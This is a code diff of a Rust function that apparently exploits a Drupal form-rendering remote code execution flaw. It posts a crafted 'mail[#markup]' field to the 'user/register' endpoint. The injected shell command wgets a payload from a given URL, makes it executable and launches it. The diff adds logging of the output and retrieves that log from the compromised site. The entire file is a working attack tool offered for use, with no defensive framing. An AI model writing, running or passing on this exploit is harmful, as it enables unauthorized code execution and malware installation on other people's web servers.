@@ -1,6 +1,9 @@
 extern crate reqwest;
-pub async fn deploy(target: &str, payload: &str) -> Result<(), Box<dyn std::error::Error>> {
-    let client = reqwest::Client::new();
+
+use reqwest::{get, Client};
+
+pub async fn deploy(target: &str, payload: &str) -> Result<String, Box<dyn std::error::Error>> {
+    let client = Client::new();
     let endpoint = "user/register";
     let query = "element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
     let req = [
@@ -11,19 +14,22 @@ pub async fn deploy(target: &str, payload: &str) -> Result<(), Box<dyn std::erro
         (
             "mail[#markup]",
             &format!(
-                "echo 'wget {} -O ~/payload; chmod +x ~/payload; ~/payload launch &' | bash",
+                "echo 'wget {} -O ~/payload && chmod +x ~/payload && ~/payload launch' | bash > \"$(pwd)/payload.log\" 2>&1",
                 payload
             )[..],
         ),
     ];
 
-    println!("{:?}", req);
-
-    let _resp = client
+    let resp = client
         .post(&format!("http://{}/{}?{}", target, endpoint, query)[..])
         .form(&req)
         .send()
         .await?;
 
-    Ok(())
+    resp.error_for_status()?;
+
+    Ok(get(&format!("http://{}/payload.log", target)[..])
+        .await?
+        .text()
+        .await?)
 }
